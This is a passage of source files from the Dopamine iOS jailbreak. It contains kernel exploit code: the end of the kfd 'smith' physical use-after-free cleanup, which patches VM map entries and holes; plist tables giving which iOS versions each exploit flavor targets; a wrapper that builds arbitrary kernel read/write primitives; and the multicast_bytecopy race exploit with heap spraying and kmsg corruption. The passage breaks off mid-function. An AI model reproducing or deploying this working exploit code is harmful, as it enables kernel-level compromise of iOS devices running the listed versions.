                u64 first_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                u64 first_vme_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                assert(first_vme_left_store == 0);
                assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                assert(entry_kaddr == vme_for_store(second_vme_left_store));
                u64 leaked_entry_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                leaked_entry_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                leaked_entry_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                assert(leaked_entry_left_store == 0);
                assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                assert(leaked_entry_end == smith->vme[3].address);
            }

            entry_kaddr = entry_next;
        }

        /*
         * Patch the doubly-linked list.
         *
         * We leak "vme2b" from the doubly-linked list, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.next, leaked_entry_next, leaked_entry_prev);
        static_kset(struct vm_map_entry, links.prev, leaked_entry_prev, leaked_entry_next);

        /*
         * Patch "vme2->vme_end".
         *
         * The kwrite() call is just a workaround if the kwrite primitive cannot
         * overwrite 0. Otherwise, the first 4 lines can be omitted.
         */
        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
        u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
        u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
        static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);

        /*
         * Patch the red-black tree.
         *
         * We leak "vme2b" from the red-black tree, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, store.entry.rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
        static_kset(struct vm_map_entry, store.entry.rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));

        /*
         * Patch map->hdr.nentries.
         *
         * I believe this is not strictly necessary to prevent a kernel panic
         * when the process exits, but I like to patch it just in case.
         */
        u64 nentries_buffer = dynamic_kget(vm_map__hdr_nentries, map_kaddr);
        i32 old_nentries = *(i32*)(&nentries_buffer);
        *(i32*)(&nentries_buffer) = (old_nentries - 1);
        dynamic_kset(vm_map__hdr_nentries, nentries_buffer, map_kaddr);

        /*
         * Patch map->hint.
         *
         * We set map->hint to point to vm_map_to_entry(map), which effectively
         * means there is no valid hint.
         */
        dynamic_kset(vm_map__hint, map_entry_kaddr, map_kaddr);
    } while (0);

    do {
        /*
         * Scan hole list: we use the kread primitive to loop through every hole
         * entry in our VM map's hole list, and record the information that we
         * need to patch things up below. Once again, there are some assertions
         * along the way to make sure the state is corrupted as expected.
         */
        u64 hole_count = 0;
        u64 hole_kaddr = dynamic_kget(vm_map__holes_list, map_kaddr);
        u64 first_hole_kaddr = hole_kaddr;
        u64 prev_hole_end = 0;
        u64 first_leaked_hole_prev = 0;
        u64 first_leaked_hole_next = 0;
        u64 first_leaked_hole_end = 0;
        u64 second_leaked_hole_prev = 0;
        u64 second_leaked_hole_next = 0;

        while (true) {
            hole_count++;
            u64 hole_next = static_kget(struct vm_map_entry, links.next, hole_kaddr);
            u64 hole_start = static_kget(struct vm_map_entry, links.start, hole_kaddr);
            u64 hole_end = static_kget(struct vm_map_entry, links.end, hole_kaddr);

            if (hole_start == 0) {
                first_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                assert(hole_end == smith->vme[2].address);
            }

            hole_kaddr = hole_next;
            prev_hole_end = hole_end;
            if (hole_kaddr == first_hole_kaddr) {
                break;
            }
        }

        /*
         * Patch the hole entries.
         *
         * We patch the end address of the first hole and we leak the two extra
         * holes, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.end, first_leaked_hole_end, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.next, first_leaked_hole_next, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, first_leaked_hole_prev, first_leaked_hole_next);
        static_kset(struct vm_map_entry, links.next, second_leaked_hole_next, second_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, second_leaked_hole_prev, second_leaked_hole_next);

        /*
         * Patch map->hole_hint.
         *
         * We set map->hole_hint to point to the first hole, which is guaranteed
         * to not be one of the two holes that we just leaked.
         */
        dynamic_kset(vm_map__hole_hint, first_hole_kaddr, map_kaddr);
    } while (0);

    if (take_vm_map_lock) {
        /*
         * Restore the entry to have its right child point to its original value.
         */
        u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
        u64 entry_right = atomic_load(&smith->cleanup_vme.right);
        static_kset(struct vm_map_entry, store.entry.rbe_right, entry_right, entry_kaddr);
        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
    }
}

#endif /* smith_h */

```

`Application/Dopamine/Exploits/kfd/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>DPExploitFlavors</key>
	<dict>
		<key>landa</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>900</integer>
			<key>DPSupportExclude</key>
			<array/>
			<key>DPSupportInclude</key>
			<array/>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>End</key>
					<string>16.6.1</string>
					<key>Start</key>
					<string>15.0</string>
				</dict>
			</array>
		</dict>
		<key>physpuppet</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>1000</integer>
			<key>DPSupportExclude</key>
			<array/>
			<key>DPSupportInclude</key>
			<array/>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>End</key>
					<string>15.7.3</string>
					<key>Start</key>
					<string>15.0</string>
				</dict>
				<dict>
					<key>End</key>
					<string>16.3.1</string>
					<key>Start</key>
					<string>16.0</string>
				</dict>
			</array>
		</dict>
		<key>smith</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>600</integer>
			<key>DPSupportExclude</key>
			<array/>
			<key>DPSupportInclude</key>
			<array>
				<dict>
					<key>Builds</key>
					<array>
						<string>20G5026e</string>
					</array>
				</dict>
			</array>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>End</key>
					<string>15.7.6</string>
					<key>Start</key>
					<string>15.0</string>
				</dict>
				<dict>
					<key>End</key>
					<string>16.5</string>
					<key>Start</key>
					<string>16.0</string>
				</dict>
			</array>
		</dict>
	</dict>
	<key>DPExploitType</key>
	<string>Kernel</string>
</dict>
</plist>

```

`Application/Dopamine/Exploits/kfd/kfd.h`:

```h
//
//  kfd.h
//  kfd
//
//  Created by Lars Fröder on 11.01.24.
//

#import <Foundation/Foundation.h>

//! Project version number for kfd.
FOUNDATION_EXPORT double kfdVersionNumber;

//! Project version string for kfd.
FOUNDATION_EXPORT const unsigned char kfdVersionString[];

// In this header, you should import all the public headers of your framework using statements like #import <kfd/PublicHeader.h>



```

`Application/Dopamine/Exploits/kfd/kfd.m`:

```m
#import "Exploit/libkfd.h"
#undef T1SZ_BOOT
#import <xpc/xpc.h>
#import <libjailbreak/info.h>
#import <libjailbreak/primitives_external.h>
#import <os/proc.h>


uint64_t gKfd = 0;

uint8_t kread8(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint8_t)out;
}
uint16_t kread16(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint16_t)out;
}
uint32_t kread32(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint32_t)out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

int kreadbuf(uint64_t where, void *buf, size_t size)
{
    if (size == 1) {
        *(uint8_t*)buf = kread8(where);
    }
    else if (size == 2) {
        *(uint16_t*)buf = kread16(where);
    }
    else if (size == 4) {
        *(uint32_t*)buf = kread32(where);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kread((u64)(gKfd), where+start, ((uint8_t *)buf)+start, sizeToUse);
            }
        } else {
            kread((u64)(gKfd), where, buf, size);
        }
    }
    return 0;
}

int kwritebuf(uint64_t where, const void *buf, size_t size)
{
    if (size == 1) {
        kwrite8(where, *(uint8_t*)buf);
    }
    else if (size == 2) {
        kwrite16(where, *(uint16_t*)buf);
    }
    else if (size == 4) {
        kwrite32(where, *(uint32_t*)buf);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kwrite((u64)(gKfd), (void*)((uint8_t *)buf)+start, where+start, sizeToUse);
            }
        } else {
            kwrite((u64)(gKfd), (void*)buf, where, size);
        }
    }
    return 0;
}

int exploit_init(const char *flavor)
{
    u64 method = 0;
    if (!strcmp(flavor, "physpuppet")) {
        method = puaf_physpuppet;
    }
    else if(!strcmp(flavor, "smith")) {
        method = puaf_smith;
    }
    else if (!strcmp(flavor, "landa")) {
        method = puaf_landa;
    }
    else {
        return -1;
    }

    bool isiOS15 = false;

    u64 kread_method = 0, kwrite_method = 0;
    if (@available(iOS 16.0, *)) {
        kread_method = kread_sem_open;
        kwrite_method = kwrite_sem_open;
    }
    else {
        kread_method = kread_IOSurface;
        kwrite_method = kwrite_IOSurface;
        isiOS15 = true;
    }

    uint64_t vm_map__pmap = koffsetof(vm_map, pmap);

    uint64_t pmap_to_hint = 0; // offset between vm_map->pmap and vm_map->hint
    if (@available(iOS 16.0, *)) {
        pmap_to_hint = 0x58;
    }
    else if(@available(iOS 15.4, *)) {
        pmap_to_hint = 0x38;
    }
    else {
        pmap_to_hint = 0xB8;
    }

    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = (kread_method == kread_IOSurface),
        .perf_supported = (kread_method != kread_IOSurface || kwrite_method != kwrite_IOSurface),
        
        .kernelcache__static_base = kconstant(staticBase),

        .proc__p_list__le_next = koffsetof(proc, list_next),
        .proc__p_list__le_prev = koffsetof(proc, list_prev),
        .proc__p_pid           = koffsetof(proc, pid),
        .proc__p_fd__fd_ofiles = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start),
        .proc__object_size     = ksizeof(proc),
    
        .task__map = koffsetof(task, map),
    
        .vm_map__hdr_links_prev             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, prev),
        .vm_map__hdr_links_next             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, next),
        .vm_map__min_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, min),
        .vm_map__max_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max),
        .vm_map__hdr_nentries               = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_nentries_u64           = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_rb_head_store_rbh_root = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x18,
    
        .vm_map__pmap        = vm_map__pmap,
        .vm_map__hint        = vm_map__pmap + pmap_to_hint,
        .vm_map__hole_hint   = vm_map__pmap + pmap_to_hint + 0x8,
        .vm_map__holes_list  = vm_map__pmap + pmap_to_hint + 0x10,
        .vm_map__object_size = vm_map__pmap + pmap_to_hint + 0x28,
        
        .IOSurface__isa                 =   0x0,
        .IOSurface__pixelFormat         =  0xa4,
        .IOSurface__allocSize           =  0xac,
        .IOSurface__useCountPtr         =  0xc0,
        .IOSurface__indexedTimestampPtr = 0x360,
        .IOSurface__readDisplacement    =  0x14,

        .thread__thread_id = 0x400, // TODO: Universalize (Only relevant for kread_kqueue_workloop_ctl)

        .kernelcache__allproc          = ksymbol(allproc),
        
        .kernelcache__cdevsw           = ksymbol(cdevsw),
        .kernelcache__gPhysBase        = ksymbol(gPhysBase),
        .kernelcache__gPhysSize        = ksymbol(gPhysSize),
        .kernelcache__gVirtBase        = ksymbol(gVirtBase),
        .kernelcache__perfmon_dev_open = ksymbol(perfmon_dev_open),
        .kernelcache__perfmon_devices  = ksymbol(perfmon_devices),
        .kernelcache__ptov_table       = ksymbol(ptov_table),
        .kernelcache__vn_kqfilter      = ksymbol(vn_kqfilter),
        
        .device__T1SZ_BOOT            = kconstant(T1SZ_BOOT),
        .device__ARM_TT_L1_INDEX_MASK = kconstant(ARM_TT_L1_INDEX_MASK),
    };

    if (isiOS15) {
        dynamic_system_info.proc__task = 0x10;
    }
    if (@available(iOS 15.4, *)) {
        dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root -= 0x8;
    }

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    // hw.memsize reports the amount of RAM after carveouts, so we pick a value lower than the
    // actual amount of RAM to compare against.
    uint64_t device_memory = 0;
    size_t device_memory_size = sizeof(device_memory);
    int res = sysctlbyname("hw.memsize", &device_memory, &device_memory_size, NULL, 0);

    size_t available_memory = os_proc_available_memory();

    int puaf_pages = 512;
    if (device_memory >= 1024 * 1024 * 1024 * 5ULL) { // 6GB devices
        // These devices are remarkably more reliable with 3072
        puaf_pages = 3072;
    } else if (cpuFamily == CPUFAMILY_ARM_TWISTER) { // A9
        puaf_pages = 128;
        if (@available(iOS 16.0, *)) {
            // sem_open does not like 128
            puaf_pages = 160;
        }
    } else if (cpuFamily == CPUFAMILY_ARM_TYPHOON) { // A8
        puaf_pages = 256;
    }

    printf("device info: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);

    size_t hogger_memory = 0;
    if (device_memory > 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
        // We want to hog 4GB at max, but we want to leave some memory for the exploit as well
        // Reserve 512MB + (puaf_pages * page size)
        size_t minimum_memory_remaining = 1024 * 1024 * 512ULL;
        // Don't hog if the available memory is less than 1.5 times the minimum memory remaining
        if (available_memory <= (size_t)(minimum_memory_remaining * 1.5)) {
            hogger_memory = 0;
        } else {
            hogger_memory = available_memory - min(minimum_memory_remaining, 1024 * 1024 * 1024 * 4ULL);
        }
    }

    printf("PUAF pages: %d, hogger memory: 0x%010zx\n", puaf_pages, hogger_memory);

    void* hogged = NULL;
    if (hogger_memory > 0) {
        hogged = malloc(hogger_memory);
        if (hogged != NULL) {
            memset(hogged, 0x41, hogger_memory);
        } else {
            printf("Failed to hog memory\n");
        }
    }

    size_t available_memory_after_hogging = os_proc_available_memory();
    printf("Available memory after hogging: 0x%010zx\n", available_memory_after_hogging);

    gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
    gPrimitives.kreadbuf = kreadbuf;
    gPrimitives.kwritebuf = kwritebuf;

    if (hogged != NULL) {
        free(hogged);
    }
    
    gSystemInfo.kernelConstant.slide = ((struct kfd *)gKfd)->info.kaddr.kernel_slide;

    return 0;
}

int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    if (!gKfd) return -1;
    kclose(gKfd);

    return 0;
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>DPExploitFlavors</key>
	<dict>
		<key>default</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>950</integer>
			<key>DPSupportExclude</key>
			<array>
				<dict>
					<key>Devices</key>
					<array>
						<string>A8</string>
						<string>A9</string>
						<string>iPad13,6</string>
						<string>iPad13,7</string>
						<string>iPad13,10</string>
						<string>iPad13,11</string>
					</array>
				</dict>
			</array>
			<key>DPSupportInclude</key>
			<array>
				<dict>
					<key>Builds</key>
					<array>
						<string>19C5026i</string>
					</array>
				</dict>
			</array>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>End</key>
					<string>15.1.1</string>
					<key>Start</key>
					<string>15.0</string>
				</dict>
			</array>
		</dict>
	</dict>
	<key>DPExploitType</key>
	<string>Kernel</string>
</dict>
</plist>

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/IOGPU.c`:

```c
#include "IOGPU.h"

#include <sys/utsname.h>

io_connect_t IOGPU_init(void)
{
    mach_port_t mp = MACH_PORT_NULL;
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("AGXAccelerator"));
    if (s == MACH_PORT_NULL)
    {
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 1, &uc) != KERN_SUCCESS)
    {
        return 0;
    }
    
    return uc;
}

void IOGPU_exit(io_connect_t uc)
{
    IOServiceClose(uc);
}

uint32_t IOGPU_create_command_queue(io_connect_t uc, uint64_t member)
{
    uint64_t outStructCnt = 0x10;
    uint32_t inStructCnt = 0x408;
    uint8_t inStruct[0x408] = {0};
    uint8_t outStruct[0x10] = {0};
    
    // avoid null termination
    memset(inStruct, 0x01, 0x30);
    *(uint64_t *)(inStruct + 0x30) = member;

    kern_return_t kr = IOConnectCallStructMethod(uc, 7, inStruct, inStructCnt, outStruct, (size_t *)&outStructCnt);

    if (kr)
        return 0;
    
    return 1;
}

int IOGPU_get_command_queue_extra_refills_needed(void)
{
    struct utsname u;
    uname(&u);
    
    // iPhone 7
    // iPhone 11
    // iPhone 12
    // iPhone 13
    // iPad mini 6
    if (
       strstr(u.machine, "iPhone9,")
    || strstr(u.machine, "iPhone12,")
    || strstr(u.machine, "iPhone13,")
    || strstr(u.machine, "iPhone14,")
    || strstr(u.machine, "iPad14,")
    )
    {
        return 1;
    }
    // iPhone 8, X
    // iPhone XS, XR
    else if (
       strstr(u.machine, "iPhone10,")
    || strstr(u.machine, "iPhone11,")
    )
    {
        return 3;
    }
    
    printf("IOGPU_get_command_queue_extra_refills_needed(): Unknown device %s! May panic in generic part until correct number 1-5 is provided for this device!\n", u.machine);
    
    return -1;
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/IOGPU.h`:

```h
#ifndef __IOGPU_H__
#define __IOGPU_H__

#include "iokit.h"

#include <mach/mach.h>
#include <stdint.h>

io_connect_t IOGPU_init(void);
void IOGPU_exit(io_connect_t uc);

uint32_t IOGPU_create_command_queue(io_connect_t uc, uint64_t member);

int IOGPU_get_command_queue_extra_refills_needed(void);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/IOSurfaceRoot.c`:

```c
#include "IOSurfaceRoot.h"

io_connect_t IOSurfaceRoot_init(void)
{
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    mach_port_t mp = MACH_PORT_NULL;
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (s == MACH_PORT_NULL)
    {
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 0, &uc) != KERN_SUCCESS)
    {
        return 0;
    }
    
    return uc;
}

void IOSurfaceRoot_exit(io_connect_t uc)
{
    IOServiceClose(uc);
}

uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc)
{
    // Brandon Azad's definitions from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xF60-0x18-0x4];
    };
    
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) 0x4000 };
    struct IOSurfaceLockResult lock_result = {0};
    uint64_t lock_result_size = sizeof(lock_result);
    
    IOConnectCallMethod(
            uc,
            6,
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, (size_t *)&lock_result_size);
    
    return lock_result.surface_id;
}

kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t sz = 0xF60;
    uint8_t o[0xF60];
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 4, &scalarInput, 1, 0, 0, 0, 0, o, (size_t *)&sz);
    return ret;
}

kern_return_t IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 1, &scalarInput, 1, 0, 0, 0, 0, 0, 0);
    return ret;
}

void IOSurfaceRoot_release_all(io_connect_t uc)
{
    for (uint32_t surf_id = 1; surf_id < 0x3FFF; ++surf_id)
    {
        IOSurfaceRoot_release_surface(uc, surf_id);
    }
}

uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    uint64_t output = 0;
    uint64_t outputCnt = 1;
    IOConnectCallMethod(uc, 16, &scalarInput, 1, 0, 0, &output, (uint32_t *)&outputCnt, 0, 0);

    return (uint32_t)output;
}

void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile)
{
    uint64_t scalarInput[3];

    scalarInput[0] = surf_id;
    scalarInput[1] = 0;
    scalarInput[2] = tile;

    IOConnectCallScalarMethod(uc, 31, (uint64_t *)&scalarInput, 3, 0, 0);
}

uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = IOSurfaceRoot_init();
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
            if (0x3400 <= (last_id * sizeof(uint64_t)))
            {
                return last_id;
            }
        }
    }
    
    return -1;
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/IOSurfaceRoot.h`:

```h
#ifndef __IOSURFACEROOT_H__
#define __IOSURFACEROOT_H__

#include "iokit.h"

#include <IOSurface/IOSurfaceRef.h>
#include <stdint.h>

io_connect_t IOSurfaceRoot_init(void);
void IOSurfaceRoot_exit(io_connect_t uc);

uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc);

kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id);

int IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id);
void IOSurfaceRoot_release_all(io_connect_t uc);

uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id);

void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile);

uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/exploit.c`:

```c
#include "exploit.h"

#include "iokit.h"
#include "IOGPU.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "kernel_base.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#define KHEAP_DATA_MAPPABLE_LOC 0xFFFFFFE383200000 // may have to be tweaked per device
#define KHEAP_DEFAULT_MAPPABLE_LOC 0xFFFFFFE376000000 // may have to be tweaked per device
#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28
#define PORTS_COUNT 0x2A00
#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
uint8_t *IOSurfaceClient_array_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;

mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;
    
    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx: %08X\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
        printf("iteration %d\n", iterations);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
        exit(1);
    }
    
